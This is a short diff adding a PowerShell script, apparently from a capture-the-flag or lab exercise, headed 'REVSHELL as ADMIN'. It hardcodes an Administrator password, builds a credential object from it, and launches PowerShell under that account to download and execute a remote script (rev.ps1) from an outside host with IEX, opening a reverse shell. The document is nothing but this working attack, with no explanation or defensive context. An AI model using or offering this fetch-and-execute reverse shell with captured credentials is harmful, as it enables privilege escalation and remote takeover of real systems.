@@ -1,0 +1,4 @@
+#REVSHELL as ADMIN
+$SecPass = ConvertTo-SecureString 's67u84zKq8IXw' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('Administrator',$SecPass)
+Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.15:7777/rev.ps1')" -Credential $cred
